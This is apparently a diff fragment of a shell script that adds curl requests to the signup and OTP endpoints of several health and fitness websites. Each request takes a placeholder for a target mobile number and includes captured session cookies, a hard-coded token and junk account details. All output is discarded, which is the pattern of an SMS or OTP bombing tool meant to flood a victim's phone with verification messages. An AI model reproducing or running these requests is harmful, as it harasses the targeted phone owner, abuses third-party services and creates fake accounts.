+  -H 'cookie: JSESSIONID=DAAF78EA58DE06B736249DDA358D5FBD; countryCode=IN; latitude=0; longitude=0; suid=8a7631de-cca7-4d1c-87d7-82dba2d4bf7a; est="utm_source=DIRECT|"; _ga=GA1.2.2078038376.1679233966; _gid=GA1.2.1509245264.1679233966; _gat=1; _fbp=fb.1.1679233965937.1538342064; we_luid=cf208a13077826e5d2aa44cf756fd86f31a053f0; AWSALB=fU0zC/AV5v8rl5K6kGh/X2oqLSs+k9ZzSCxW7FDkKvGCMiYNx/syhSe7/Cg5UXxRZncc6uW/Gk6wmKy9pILh6ADX18wSpZDrpCqllh2uvJMXb9SSw6aMDU0xVtS9; AWSALBCORS=fU0zC/AV5v8rl5K6kGh/X2oqLSs+k9ZzSCxW7FDkKvGCMiYNx/syhSe7/Cg5UXxRZncc6uW/Gk6wmKy9pILh6ADX18wSpZDrpCqllh2uvJMXb9SSw6aMDU0xVtS9' \
+  -H 'origin: https://www.lybrate.com' \
+  -H 'referer: https://www.lybrate.com/signup' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  --data-raw '{"countryCode":"IN","firstName":"vhjgzz","email":"xvvcsv@gmail.com","mobile":"€tor","password":"123456854213"}' \
+  --compressed > /dev/null 2>&1
+  
+  
+curl 'https://kapeefit.com/public/views/templates/login/otp-verify.php?mobile=€tor' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'Accept: text/html, */*; q=0.01' \
+  -H 'Referer: https://kapeefit.com/login' \
+  -H 'X-Requested-With: XMLHttpRequest' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  --compressed > /dev/null 2>&1
+
+curl 'https://www.docgenie.in/apis//otp/generateotp.php' \
+  -H 'authority: www.docgenie.in' \
+  -H 'accept: application/json, text/plain, */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/json' \
+  -H 'cookie: _gid=GA1.2.1342440784.1679234169; _gat_gtag_UA_172446656_1=1; _ga_WLL9BP8CB5=GS1.1.1679234169.1.0.1679234169.0.0.0; _gcl_au=1.1.807414040.1679234169; _fbp=fb.1.1679234169920.665095662; _clck=iaqxky|1|fa1|0; _clsk=13osg50|1679234170971|1|1|r.clarity.ms/collect; _ga=GA1.2.895373929.1679234169; _gat_UA-172446656-1=1' \
+  -H 'origin: https://www.docgenie.in' \
+  -H 'referer: https://www.docgenie.in/login' \
+  -H 'sec-ch-ua: "Microsoft Edge";v="111", "Not(A:Brand";v="8", "Chromium";v="111"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.44' \
+  --data-raw '{"phoneno":"€tor","apptype":"WEB","token":"QWERTYMKIUIEDFRTYUTFRTEDFRTYGHYTFREDS123-WWE324567"}' \
   --compressed > /dev/null 2>&1
